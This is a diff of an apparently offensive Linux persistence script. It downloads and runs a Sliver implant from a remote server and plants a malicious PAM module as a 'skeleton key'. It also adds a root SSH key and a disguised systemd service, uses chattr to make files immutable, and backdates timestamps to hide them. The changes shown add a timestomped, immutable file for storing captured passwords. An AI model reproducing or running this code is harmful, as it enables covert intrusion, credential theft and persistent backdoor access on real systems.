@@ -22,7 +22,7 @@ RANDOM_BINARY_NAME="authenticate"
 
 SLIVER_PAYLOAD_PATH="/etc/$RANDOM_ETC_DIR/$RANDOM_BINARY_NAME"
 PAM_SO_PATH="/etc/pam.d/pam_login.so"
-
+PAM_PASSWORD_STORE="/etc/pam_out"
 
 
 # Pull and run sliver payload
@@ -35,13 +35,16 @@ chattr +i "$SLIVER_PAYLOAD_PATH" 2>/dev/null
 "$SLIVER_PAYLOAD_PATH" >/dev/null 2>&1 &
 
 
-# Deploy the PAM module
+# Deploy the PAM module and set up password store
 wget "http://$SERVER/$PAM_SO_NAME" -O "$PAM_SO_PATH" >/dev/null 2>&1
 chmod 644 "$PAM_SO_PATH"
 touch -d "Mar 15 2018" "$PAM_SO_PATH"
 touch -d "Mar 15 2018" "/etc/pam.d/"
 chattr +i "$PAM_SO_PATH"
 
+
+touch -d "Aug 2 2014" "$PAM_PASSWORD_STORE"
+chattr +i "$PAM_PASSWORD_STORE"
 
 # Write SSH key to /root/.ssh/authorized_keys
 mkdir -p /root/.ssh
@@ -109,7 +112,7 @@ systemctl daemon-reload >/dev/null 2>&1
 systemctl enable gpu.service >/dev/null 2>&1
 systemctl start gpu.service >/dev/null 2>&1
 
-# PAM Skeleton Key
+# PAM Skeleton Key 
 PAM_FILE="/etc/pam.d/common-auth"
 
 # Inject PAM module if not already present
